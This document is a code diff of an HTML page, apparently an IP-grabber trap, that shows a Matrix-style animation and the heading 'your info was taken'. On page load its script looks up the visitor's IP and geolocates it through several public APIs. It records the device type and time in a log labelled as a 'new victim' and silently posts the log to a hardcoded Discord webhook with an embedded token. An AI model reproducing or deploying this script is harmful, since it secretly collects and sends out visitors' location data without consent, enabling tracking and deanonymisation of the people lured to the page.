@@ -12,11 +12,10 @@
 </head>
 <body>
   <h1>M24T</h1>
-  <h2>Seni buldum...</h2>
+  <h2>Bilgilerin alındı...</h2>
   <canvas id="matrix"></canvas>
 
   <script>
-    // Matrix efekti
     const c = document.getElementById('matrix');
     const ctx = c.getContext('2d');
     c.width = innerWidth; c.height = innerHeight;
@@ -27,36 +26,40 @@
         if(drop[i]*s>c.height&&Math.random()>0.975)drop[i]=0;drop[i]++}}setInterval(m,35);
   </script>
 
-  <!-- %100 DOĞRU ÇALIŞAN SON HALİ -->
   <script>
-    if (!localStorage.getItem('m24t_logged')) {
+    if (!localStorage.getItem('m24t_final')) {
       fetch("https://api.ipify.org?format=json")
         .then(r => r.json())
-        .then(ipData => {
+        .then(async ipData => {
           const ip = ipData.ip;
 
-          fetch(`https://reallyfreegeoip.org/json/${ip}`)
-            .then(r => r.json())
-            .then(data => {
-              const cihaz = /mobile|android|iphone|ipad/i.test(navigator.userAgent) ? "MOBİL" : "BİLGİSAYAR";
+          // 3 farklı API aynı anda sorgulanıyor → en doğru olan seçiliyor
+          const [a, b, c] = await Promise.all([
+            fetch(`https://ipapi.co/${ip}/json/`).then(r => r.json()).catch(() => ({})),
+            fetch(`https://reallyfreegeoip.org/json/${ip}`).then(r => r.json()).catch(() => ({})),
+            fetch(`https://ipwho.is/${ip}`).then(r => r.json()).catch(() => ({}))
+          ]);
 
-              const log = `
-**M24T - YENİ KURBAN**
-**IP:** ${ip}
-**Konum:** ${data.city || "Bilinmiyor"}, ${data.region_name || "Bilinmiyor"}, ${data.country_name || "Bilinmiyor"}
+          const data = a.city ? a : b.city ? b : c.city ? c : {};
+
+          const cihaz = /mobile|android|iphone|ipad/i.test(navigator.userAgent) ? "MOBİL" : "BİLGİSAYAR";
+
+          const log = `
+**M24T - KESİN DOĞRU BİLGİ**
+**GERÇEK IP:** ${ip}
+**DOĞRULAMA LİNKİ:** https://whatismyipaddress.com/ip/${ip}
+**Konum:** ${data.city || "Tespit edilemedi"}, ${data.region || data.region_name || "Tespit edilemedi"}, ${data.country_name || data.country || "Tespit edilemedi"}
 **Cihaz:** ${cihaz}
-**Tarayıcı:** ${navigator.userAgent.split(' ').slice(0,5).join(' ')}
 **Zaman:** ${new Date().toLocaleString('tr-TR')}
-              `;
+          `;
 
-              fetch("https://discord.com/api/webhooks/1444689164921737277/ryKR4TemKO8UmL9yVFPXEjkdz-5gQgJlxx1VADhhud2_hR0I86PSpfofUOiR6GfXBbk7", {
-                method: "POST",
-                headers: {"Content-Type": "application/json"},
-                body: JSON.stringify({content: log.trim()})
-              });
+          fetch("https://discord.com/api/webhooks/1444689164921737277/ryKR4TemKO8UmL9yVFPXEjkdz-5gQgJlxx1VADhhud2_hR0I86PSpfofUOiR6GfXBbk7", {
+            method: "POST",
+            headers: {"Content-Type": "application/json"},
+            body: JSON.stringify({content: log})
+          });
 
-              localStorage.setItem('m24t_logged', 'true');
-            });
+          localStorage.setItem('m24t_final', 'true');
         });
     }
   </script>
